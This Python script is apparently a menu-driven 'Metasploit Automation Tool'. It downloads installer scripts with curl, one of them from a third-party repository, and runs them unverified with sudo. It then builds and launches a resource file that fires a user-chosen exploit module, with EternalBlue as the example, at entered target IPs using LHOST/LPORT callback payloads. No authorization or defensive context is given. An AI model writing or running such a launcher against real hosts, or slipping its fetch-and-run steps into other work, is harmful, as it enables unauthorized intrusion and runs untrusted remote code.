import os
import subprocess
import platform
import time
def detect_env():
    if "android" in platform.uname().release.lower():
        print(". Android Environment Detected. Running on  Termux.")
        return "termux"
    elif platform.system() == "Linux":
        print(". Linux Environment Detected. Running on Terminal.")
        return "linux"
    else:
        print(". Unsupported environment detected. Exiting.")
        return "unsupported"

ENVIRONMENT = detect_env()


def install_metasploit():
    
    
    if "linux" == ENVIRONMENT:
        try:
            print("\n[+] Updating system packages...")
            subprocess.run(["sudo", "apt", "update", "-y"])
            subprocess.run(["sudo", "apt", "upgrade", "-y"])
            print("[+] Installing dependencies...")
            subprocess.run(["sudo", "apt", "install", "curl", "git", "wget", "nmap", "ruby", "gcc", "make", "-y"])
            print("[+] Downloading Metasploit installer...")
            subprocess.run(["curl", "https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall", "-o", "msfinstall"])
            subprocess.run(["chmod", "+x", "msfinstall"])
            print("[+] Installing Metasploit Framework...")
            subprocess.run(["sudo", "./msfinstall"])
            print("\n[✓] Metasploit installed successfully!")
        except Exception as e:
            print(f"[!] Installation failed: {e}")

    elif "termux" == ENVIRONMENT :
        try:
            print("[+] Detected Termux - Installing Metasploit for Termux")
            subprocess.run(["pkg", "update", "-y"])
            subprocess.run(["pkg", "upgrade", "-y"])
            subprocess.run(["pkg", "install", "wget", "curl", "git", "ruby", "-y"])
            subprocess.run(["curl", "-LO", "https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh"])
            subprocess.run(["chmod", "+x", "metasploit.sh"])
            subprocess.run(["./metasploit.sh"])
            print("\n[✓] Metasploit installed successfully in Termux!")
        except Exception as e:
            print(f"[!] Termux installation failed: {e}")
    else:
        print("[!] Unsupported OS.")
def automate_metasploit():
    print("\n[+] Automating Metasploit Task (Manual Input Mode)...")
    
    # Ask the user for Metasploit exploit details
    exploit_name = input("Enter exploit module (e.g., exploit/windows/smb/ms17_010_eternalblue): ").strip()
    rhosts = input("Enter target IP(s) (RHOSTS): ").strip()
    lhost = input("Enter your local IP (LHOST): ").strip()
    lport = input("Enter listening port (LPORT): ").strip()
    
    # Optional: Ask for payload type
    payload = input("Enter payload (leave blank for default): ").strip()
    
    script_path = "/tmp/auto_exploit.rc"
    
    with open(script_path, "w") as f:
        f.write(f"use {exploit_name}\n")
        if payload:
            f.write(f"set PAYLOAD {payload}\n")
        f.write(f"set RHOSTS {rhosts}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write("exploit\n")
    
    print(f"[+] Resource script created: {script_path}")
    print("[+] Launching Metasploit Console with the script...")
    
    try:
        subprocess.run(["msfconsole", "-r", script_path])
    except FileNotFoundError:
        print("[!] msfconsole not found. Ensure Metasploit is correctly installed and added to PATH.")

def main_menu():
    while True:
        print("\n========= Metasploit Automation Tool =========")
        print("1. Install Metasploit Framework")
        print("2. Run Automated Metasploit Exploit")
        print("3. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            install_metasploit()
        elif choice == '2':
            automate_metasploit()
        elif choice == '3':
            print("Exiting. Goodbye.")
            break
        else:
            print("Invalid choice. Try again.")

# Run the tool
if __name__ == "__main__":
    main_menu()
